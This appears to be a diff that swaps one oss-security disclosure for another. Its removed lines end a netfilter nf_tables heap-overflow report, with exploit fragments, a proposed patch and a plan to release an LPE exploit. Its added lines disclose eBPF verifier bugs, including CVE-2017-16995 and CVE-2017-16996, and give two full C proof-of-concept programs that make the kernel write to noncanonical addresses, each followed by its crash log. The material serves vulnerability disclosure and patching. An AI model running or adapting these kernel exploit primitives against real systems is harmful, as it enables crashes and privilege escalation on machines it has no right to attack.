-> ??????? do_error_exit("bind");
-> ??? }
-> ??? printf("[+] Netlink socket bound\n");
-> 
-> ??? /* Create a netfilter table */
-> ??? create_table(sock, TABLE);
-> ??? printf("[+] Table created\n");
-> 
-> ??? /*? Create a netfilter set */
-> ??? create_set(sock, SET_NAME, KMALLOC64_KEYLEN, BUFFER_SIZE, TABLE, ID);
-> ??? printf("[+] Set created\n");
-> 
-> ??? /* Prepare the payload for the write primitive */
-> ??? add_elem_to_set(sock, SET_NAME, KMALLOC64_KEYLEN, TABLE, ID, 
-> BUFFER_SIZE, buffer);
-> ??? printf("[+] Overflow done\n");
-> 
-> ??? return EXIT_SUCCESS;
-> }
-> ```
-> 
-> We propose the following patch. We think that the comparison must be 
-> mandatory and may be enough for patch this vulnerability.
-> However, we are not experts at Linux kernel programming and we are still 
-> unsure if it will not break something along the way.
-> This patch was applied on the current upstream version.
-> 
-> ```diff
-> static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
-> ????????????????? struct nft_data_desc *desc,
-> ????????????????? struct nft_data *data,
-> ????????????????? struct nlattr *attr)
-> {
-> 
-> ??? ...
-> 
-> -??? if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) {
-> +??? if (desc->len != set->dlen) {
-> 
-> ?? ???? ??? ??? nft_data_release(data, desc->type);
-> ??????? return -EINVAL;
-> ??? }
-> 
-> ??? return 0;
-> }
-> ```
-> 
-> We would like to reserve a CVE for this vulnerability.
-> 
-> Also, we would like to release the LPE exploit targeting Ubuntu server 
-> along with a more detailed blogpost.
-> If needed, we can supply the exploit. Depending of your workload, we can 
-> suggest the August, 15th 2022 as a potential date for public disclosure.
-> 
-> Thank you for your attention and we also would like to thank you for all 
-> the work put on the Linux kernel.
-> 
-> ----- End forwarded message -----
+The fixes are in the net tree of the Linux kernel
+(https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/log/kernel/bpf),
+but not in Linus' tree yet.
+
+The following bug was introduced in 4.9:
+
+=== fixed by "bpf: fix incorrect sign extension in check_alu_op()" ===
+check_alu_op() did not distinguish between
+BPF_ALU64|BPF_MOV|BPF_K (load 32-bit immediate, sign-extended to 64-bit)
+and BPF_ALU|BPF_MOV|BPF_K (load 32-bit immediate, zero-padded to 64-bit);
+it performed sign extension in both cases.
+Debian assigned CVE-2017-16995 for this issue.
+
+
+The following bugs were introduced in 4.14:
+
+=== fixed by "bpf/verifier: fix bounds calculation on BPF_RSH" ===
+Incorrect signed bounds were being computed for BPF_RSH.
+If the old upper signed bound was positive and the old lower signed bound was
+negative, this could cause the new upper signed bound to be too low,
+leading to security issues.
+
+=== fixed by "bpf: fix incorrect tracking of register size truncation" ===
+The BPF verifier did not properly handle register truncation to a smaller size.
+
+The old code first mirrors the clearing of the high 32 bits in the bitwise
+tristate representation, which is correct. But then, it computes the new
+arithmetic bounds as the intersection between the old arithmetic bounds and
+the bounds resulting from the bitwise tristate representation. Therefore,
+when coerce_reg_to_32() is called on a number with bounds
+[0xffff'fff8, 0x1'0000'0007], the verifier computes
+[0xffff'fff8, 0xffff'ffff] as bounds of the truncated number.
+This is incorrect: The truncated number could also be in the range [0, 7],
+and no meaningful arithmetic bounds can be computed in that case apart from
+the obvious [0, 0xffff'ffff].
+Debian assigned CVE-2017-16996 for this issue.
+
+=== fixed by "bpf: fix 32-bit ALU op verification" ===
+adjust_scalar_min_max_vals() only truncates its inputs and otherwise operates on
+64-bit numbers while the BPF interpreter and JIT perform 32-bit arithmetic.
+This means that the output of e.g. `(u32)0x40000000*(u32)5` will be incorrect.
+To test this, you can use the following BPF code:
+
+        BPF_MOV32_IMM(BPF_REG_1, 0x40000000),
+        BPF_ALU32_IMM(BPF_MUL, BPF_REG_1, 5),
+        BPF_EXIT_INSN()
+
+The verifier generates the following output, which is incorrect:
+
+        0: R1=ctx(id=0,off=0,imm=0) R10=fp0
+        0: (b4) (u32) r1 = (u32) 1073741824
+        1: R1=inv1073741824 R10=fp0
+        1: (24) (u32) r1 *= (u32) 5
+        2: R1=inv5368709120 R10=fp0
+        2: (95) exit
+        R0 !read_ok
+
+=== fixed by "bpf: fix missing error return in check_stack_boundary()" ===
+check_stack_boundary() prints an error into the verifier log, but doesn't
+exit, when a stack pointer doesn't have a known offset. This should be
+usable to get read+write access to spilled stack pointers.
+
+=== fixed by "bpf: force strict alignment checks for stack pointers" ===
+The verifier did not force strict alignment checks for stack pointers, but
+the tracking of stack spills relies on it; unaligned stack accesses can
+lead to corruption of spilled registers, which is exploitable.
+
+=== fixed by "bpf: don't prune branches when a scalar is replaced with
+a pointer" ===
+The BPF verifier pruned branches when a scalar is replaced with
+a pointer, explicitly permitting confusing a pointer into a number
+(but not the other way around). This is a kernel pointer leak.
+
+=== fixed by "bpf: fix integer overflows" ===
+There were various issues related to the limited size of integers used in
+the verifier:
+ - `off + size` overflow in __check_map_access()
+ - `off + reg->off` overflow in check_mem_access()
+ - `off + reg->var_off.value` overflow or 32-bit truncation of
+   `reg->var_off.value` in check_mem_access()
+ - 32-bit truncation in check_stack_boundary()
+
+
+
+Crash PoCs for some of these issues are at
+https://bugs.chromium.org/p/project-zero/issues/detail?id=1454,
+but since oss-security prefers having PoCs in the mail directly, I've
+pasted the PoCs below.
+For the other issues, examples of how to trigger them are in the
+added BPF selftests.
+The rest of the mail is just PoC code, so if you're not interested
+in the PoCs, you can stop reading now.
+
+
+
+
+=== PoC for "bpf: fix incorrect sign extension in check_alu_op()" ===
+Here is a crasher that tries to write to a noncanonical address.
+Note that it is only designed to work on 4.14.
+
+======================================
+user@debian:~/bpf_range$ cat crasher_badimm.c
+#define _GNU_SOURCE
+#include <err.h>
+#include <stdint.h>
+#include <linux/bpf.h>
+#include <linux/filter.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <asm/unistd_64.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+/* start from kernel */
+#define BPF_EMIT_CALL(FUNC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_CALL,            \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = (FUNC) }) /* ??? */
+#define BPF_MOV32_IMM(DST, IMM)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_MOV | BPF_K,     \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_REG_ARG1    BPF_REG_1
+#define BPF_REG_ARG2    BPF_REG_2
+#define BPF_REG_ARG3    BPF_REG_3
+#define BPF_REG_ARG4    BPF_REG_4
+#define BPF_REG_ARG5    BPF_REG_5
+#define BPF_PSEUDO_MAP_FD   1
+#define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_LD | BPF_DW | BPF_IMM,     \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = (__u32) (IMM) }),          \
+    ((struct bpf_insn) {                    \
+        .code  = 0, /* zero is reserved opcode */   \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = ((__u64) (IMM)) >> 32 })
+#define BPF_ALU32_IMM(OP, DST, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_LD_MAP_FD(DST, MAP_FD)              \
+    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
+#define BPF_ALU32_REG(OP, DST, SRC)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_OP(OP) | BPF_X,      \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_EXIT_INSN()                     \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_EXIT,            \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = 0 })
+/* Memory store, *(uint *) (dst_reg + off16) = src_reg */
+#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = OFF,                   \
+        .imm   = 0 })
+#define BPF_REG_FP  BPF_REG_10
+#define BPF_MOV64_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_ALU64_IMM(OP, DST, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_MOV64_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_REG_TMP BPF_REG_8
+#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = OFF,                   \
+        .imm   = 0 })
+#define BPF_JMP_IMM(OP, DST, IMM, OFF)              \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = OFF,                   \
+        .imm   = IMM })
+#define BPF_MOV64_IMM(DST, IMM)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_ALU64_REG(OP, DST, SRC)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_MOV32_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_MOV | BPF_X,     \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+/* end from kernel */
+
+
+int bpf_(int cmd, union bpf_attr *attrs) {
+    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
+}
+
+void array_set(int mapfd, uint32_t key, uint32_t value) {
+    union bpf_attr attr = {
+        .map_fd = mapfd,
+        .key    = (uint64_t)&key,
+        .value  = (uint64_t)&value,
+        .flags  = BPF_ANY,
+    };
+
+
+    int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
+    if (res)
+        err(1, "map update elem");
+}
+
+
+int main(void) {
+    union bpf_attr create_map_attrs = {
+        .map_type = BPF_MAP_TYPE_ARRAY,
+        .key_size = 4,
+        .value_size = 8,
+        .max_entries = 16
+    };
+    int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
+    if (mapfd == -1)
+        err(1, "map create");
+
+
+    array_set(mapfd, 1, 1);
+
+    char verifier_log[100000];
+    struct bpf_insn insns[] = {
+        BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
+
+        // fill r0 with pointer to map value
+        BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack
+        BPF_MOV32_IMM(BPF_REG_ARG2, 1),
+        BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),
+        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP),
+        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
+        BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
+        BPF_EXIT_INSN(), // exit
+
+        // r1 = 0xffff'ffff, mistreated as 0xffff'ffff'ffff'ffff
+        BPF_MOV32_IMM(BPF_REG_1, 0xffffffff),
+        // r1 = 0x1'0000'0000, mistreated as 0
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),
+        // r1 = 0x1000'0000'0000'0000, mistreated as 0
+        BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 28),
+
+        // compute noncanonical pointer
+        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),
+
+        // crash by writing to noncanonical pointer
+        BPF_MOV32_IMM(BPF_REG_1, 0xdeadbeef),
+        BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, 0),
+
+        // terminate to make the verifier happy
+        BPF_MOV32_IMM(BPF_REG_0, 0),
+        BPF_EXIT_INSN()
+    };
+    union bpf_attr create_prog_attrs = {
+        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
+        .insn_cnt = sizeof(insns) / sizeof(insns[0]),
+        .insns = (uint64_t)insns,
+        .license = (uint64_t)"",
+        .log_level = 2,
+        .log_size = sizeof(verifier_log),
+        .log_buf = (uint64_t)verifier_log
+    };
+    int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
+    if (progfd == -1) {
+        perror("prog load");
+        puts(verifier_log);
+        return 1;
+    }
+    puts("ok so far?");
+
+    int socks[2];
+    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
+        err(1, "socketpair");
+    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
+        err(1, "setsockopt");
+    if (write(socks[1], "a", 1) != 1)
+        err(1, "write");
+    char c;
+    if (read(socks[0], &c, 1) != 1)
+        err(1, "read res");
+    return 0;
+}
+user@debian:~/bpf_range$ gcc -o crasher_badimm crasher_badimm.c -Wall
+&& ./crasher_badimm
+ok so far?
+Segmentation fault
+======================================
+
+
+Here is the resulting crash (note the corrupted heap address in R15):
+
+======================================
+[10599.403881] general protection fault: 0000 [#6] SMP KASAN
+[10599.403886] Modules linked in: binfmt_misc snd_hda_codec_generic
+crct10dif_pclmul crc32_pclmul ghash_clmulni_intel snd_hda_intel
+snd_hda_codec pcbc snd_hda_core qxl snd_hwdep snd_pcm snd_timer ttm
+aesni_intel snd ppdev aes_x86_64 drm_kms_helper parport_pc crypto_simd
+soundcore glue_helper drm parport evdev cryptd sg serio_raw pcspkr
+virtio_console virtio_balloon button ip_tables x_tables autofs4 ext4
+crc16 mbcache jbd2 fscrypto sr_mod cdrom sd_mod ata_generic 8139too
+ehci_pci ata_piix uhci_hcd libata ehci_hcd 8139cp crc32c_intel mii
+virtio_pci psmouse usbcore virtio_ring scsi_mod virtio i2c_piix4
+floppy
+[10599.403952] CPU: 7 PID: 1610 Comm: crasher_badimm Tainted: G    B D
+         4.15.0-rc1+ #4
+[10599.403954] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
+BIOS 1.10.2-1 04/01/2014
+[10599.403957] task: 000000004ae6ce3e task.stack: 000000006149ccc2
+[10599.403963] RIP: 0010:___bpf_prog_run+0x1a77/0x2490
+[10599.403966] RSP: 0018:ffff8801ef6bf838 EFLAGS: 00010292
+[10599.403969] RAX: 0000000000000000 RBX: ffffc900016150b8 RCX: ffffffff866483d7
+[10599.403971] RDX: 0000000000000001 RSI: 0000000000000004 RDI: 0fff8801ac393b78
+[10599.403974] RBP: ffff8801ef6bf968 R08: 0000000000000000 R09: 0000000000000000
+[10599.403976] R10: 0000000000000001 R11: ffffed00358726b9 R12: ffffffff870be980
+[10599.403978] R13: 1ffff1003ded7f0e R14: 00000000deadbeef R15: 0fff8801ac393b78
+[10599.403981] FS:  00007fd705b43700(0000) GS:ffff8801f77c0000(0000)
+knlGS:0000000000000000
+[10599.403984] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[10599.403986] CR2: 0000561c31a24008 CR3: 00000001b153b002 CR4: 00000000001606e0
+[10599.403991] Call Trace:
+[10599.403997]  ? sk_filter_trim_cap+0x5c/0x4e0
+[10599.404000]  ? bpf_jit_compile+0x30/0x30
+[10599.404006]  ? alloc_skb_with_frags+0x90/0x2c0
+[10599.404010]  ? __bpf_prog_run32+0x83/0xc0
+[10599.404013]  ? __bpf_prog_run64+0xc0/0xc0
+[10599.404017]  ? sk_filter_trim_cap+0x5c/0x4e0
+[10599.404022]  ? sk_filter_trim_cap+0xf7/0x4e0
+[10599.404028]  ? unix_dgram_sendmsg+0x3e2/0x960
+[10599.404033]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[10599.404036]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[10599.404040]  ? sock_alloc_inode+0x46/0x110
+[10599.404043]  ? unix_stream_connect+0x840/0x840
+[10599.404046]  ? __sock_create+0x7f/0x2c0
+[10599.404049]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[10599.404054]  ? __lock_acquire.isra.31+0x2d/0xb40
+[10599.404059]  ? __wake_up_common_lock+0xaf/0x130
+[10599.404065]  ? unix_stream_connect+0x840/0x840
+[10599.404068]  ? sock_sendmsg+0x6b/0x80
+[10599.404071]  ? sock_write_iter+0x11d/0x1d0
+[10599.404075]  ? sock_sendmsg+0x80/0x80
+[10599.404080]  ? do_raw_spin_unlock+0x86/0x120
+[10599.404084]  ? iov_iter_init+0x77/0xb0
+[10599.404089]  ? __vfs_write+0x23e/0x340
+[10599.404092]  ? kernel_read+0xa0/0xa0
+[10599.404098]  ? __fd_install+0x5/0x160
+[10599.404102]  ? __fget_light+0x9b/0xb0
+[10599.404107]  ? vfs_write+0xe9/0x240
+[10599.404110]  ? SyS_write+0xa7/0x130
+[10599.404121]  ? SyS_read+0x130/0x130
+[10599.404125]  ? lockdep_sys_exit+0x16/0x8e
+[10599.404129]  ? lockdep_sys_exit_thunk+0x16/0x2b
+[10599.404133]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[10599.404138] Code: 00 48 0f bf 43 fa 49 01 c7 0f b6 43 f9 c0 e8 04
+0f b6 c0 4c 8d 74 c5 00 4c 89 f7 e8 04 4a 0f 00 4d 8b 36 4c 89 ff e8
+79 49 0f 00 <45> 89 37 e9 17 e6 ff ff 48 8d 7b 01 e8 58 47 0f 00 0f b6
+43 01
+[10599.404200] RIP: ___bpf_prog_run+0x1a77/0x2490 RSP: ffff8801ef6bf838
+[10599.404204] ---[ end trace e8c17e9abe81bd46 ]---
+======================================
+
+
+
+
+=== PoC for "bpf: fix incorrect tracking of register size truncation" ===
+Here is a crasher that uses this to again write to a noncanonical address:
+
+
+======================================
+#define _GNU_SOURCE
+#include <err.h>
+#include <stdint.h>
+#include <linux/bpf.h>
+#include <linux/filter.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <asm/unistd_64.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+/* start from kernel */
+#define BPF_EMIT_CALL(FUNC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_CALL,            \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = (FUNC) }) /* ??? */
+#define BPF_MOV32_IMM(DST, IMM)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_MOV | BPF_K,     \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_REG_ARG1    BPF_REG_1
+#define BPF_REG_ARG2    BPF_REG_2
+#define BPF_REG_ARG3    BPF_REG_3
+#define BPF_REG_ARG4    BPF_REG_4
+#define BPF_REG_ARG5    BPF_REG_5
+#define BPF_PSEUDO_MAP_FD   1
+#define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_LD | BPF_DW | BPF_IMM,     \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = (__u32) (IMM) }),          \
+    ((struct bpf_insn) {                    \
+        .code  = 0, /* zero is reserved opcode */   \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = ((__u64) (IMM)) >> 32 })
+#define BPF_ALU32_IMM(OP, DST, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_LD_MAP_FD(DST, MAP_FD)              \
+    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
+#define BPF_ALU32_REG(OP, DST, SRC)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_OP(OP) | BPF_X,      \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_EXIT_INSN()                     \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_EXIT,            \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = 0 })
+/* Memory store, *(uint *) (dst_reg + off16) = src_reg */
+#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = OFF,                   \
+        .imm   = 0 })
+#define BPF_REG_FP  BPF_REG_10
+#define BPF_MOV64_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_ALU64_IMM(OP, DST, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_MOV64_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_REG_TMP BPF_REG_8
+#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = OFF,                   \
+        .imm   = 0 })
+#define BPF_JMP_IMM(OP, DST, IMM, OFF)              \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = OFF,                   \
+        .imm   = IMM })
+#define BPF_MOV64_IMM(DST, IMM)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_ALU64_REG(OP, DST, SRC)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_MOV32_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_MOV | BPF_X,     \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+/* end from kernel */
+
+
+int bpf_(int cmd, union bpf_attr *attrs) {
+    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
+}
+
+void array_set(int mapfd, uint32_t key, uint32_t value) {
+    union bpf_attr attr = {
+        .map_fd = mapfd,
+        .key    = (uint64_t)&key,
+        .value  = (uint64_t)&value,
+        .flags  = BPF_ANY,
+    };
+
+
+    int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
+    if (res)
+        err(1, "map update elem");
+}
+
+
+int main(void) {
+    union bpf_attr create_map_attrs = {
+        .map_type = BPF_MAP_TYPE_ARRAY,
+        .key_size = 4,
+        .value_size = 8,
+        .max_entries = 16
+    };
+    int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
+    if (mapfd == -1)
+        err(1, "map create");
+
+
+    array_set(mapfd, 1, 1);
+
+    char verifier_log[100000];
+    struct bpf_insn insns[] = {
+        BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
+
+        // fill r3 with value in range [0x0, 0xf], actually 0x8:
+        // first load map value pointer...
+        BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack
+        BPF_MOV32_IMM(BPF_REG_ARG2, 1),
+        BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),
+        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP),
+        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
+        BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
+        BPF_EXIT_INSN(), // exit
+
+        // ... then write, read, mask map value
+        // (tracing actual values through a map is impossible)
+        BPF_MOV32_IMM(BPF_REG_3, 8),
+        BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_3, 0),
+        BPF_LDX_MEM(BPF_W, BPF_REG_3, BPF_REG_0, 0),
+        BPF_ALU64_IMM(BPF_AND, BPF_REG_3, 0xf),
+
+        // load r1=0xffff'fff8 while working around the first verifier bug
+        BPF_MOV32_IMM(BPF_REG_1, 0xfffffff8>>1),
+        BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_1),
+
+        // r1 in range [0xffff'fff8, 0x1'0000'0007]
+        BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_3),
+
+        // load r2=0
+        BPF_MOV32_IMM(BPF_REG_2, 0),
+
+        // trigger verifier bug:
+        // visible range: [0xffff'fff8, 0xffff'ffff]
+        // hidden range: [0, 7]
+        // actual value: 0
+        BPF_ALU32_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
+
+        // collapse down: verifier sees 1, actual value 0
+        BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 31),
+
+        // flip: verifier sees 0, actual value 1
+        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),
+        BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, -1),
+
+        // r1 = 0x1000'0000'0000'0000, verifier sees 0
+        BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 60),
+
+        // compute noncanonical pointer
+        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),
+
+        // crash by writing to noncanonical pointer
+        BPF_MOV32_IMM(BPF_REG_1, 0xdeadbeef),
+        BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, 0),
+
+        // terminate to make the verifier happy
+        BPF_MOV32_IMM(BPF_REG_0, 0),
+        BPF_EXIT_INSN()
+    };
+    union bpf_attr create_prog_attrs = {
+        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
+        .insn_cnt = sizeof(insns) / sizeof(insns[0]),
+        .insns = (uint64_t)insns,
+        .license = (uint64_t)"",
+        .log_level = 2,
+        .log_size = sizeof(verifier_log),
+        .log_buf = (uint64_t)verifier_log
+    };
+    int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
+    if (progfd == -1) {
+        perror("prog load");
+        puts(verifier_log);
+        return 1;
+    }
+    puts("ok so far?");
+
+    int socks[2];
+    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
+        err(1, "socketpair");
+    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
+        err(1, "setsockopt");
+    if (write(socks[1], "a", 1) != 1)
+        err(1, "write");
+    char c;
+    if (read(socks[0], &c, 1) != 1)
+        err(1, "read res");
+    return 0;
+}
+user@debian:~/bpf_range$ gcc -o crasher_badtrunc crasher_badtrunc.c
+-Wall && ./crasher_badtrunc
+ok so far?
+Segmentation fault
+======================================
+
+
+Here's the resulting crash:
+
+======================================
+[  117.274571] general protection fault: 0000 [#2] SMP KASAN
+[  117.274575] Modules linked in: binfmt_misc snd_hda_codec_generic
+qxl snd_hda_intel snd_hda_codec ttm snd_hda_core drm_kms_helper
+snd_hwdep crct10dif_pclmul snd_pcm drm crc32_pclmul
+ghash_clmulni_intel snd_timer pcbc aesni_intel aes_x86_64 snd
+crypto_simd evdev glue_helper soundcore ppdev cryptd virtio_balloon sg
+virtio_console serio_raw parport_pc parport pcspkr button ip_tables
+x_tables autofs4 ext4 crc16 mbcache jbd2 fscrypto sr_mod sd_mod cdrom
+ata_generic 8139too ehci_pci virtio_pci crc32c_intel ata_piix uhci_hcd
+psmouse virtio_ring virtio floppy ehci_hcd libata usbcore scsi_mod
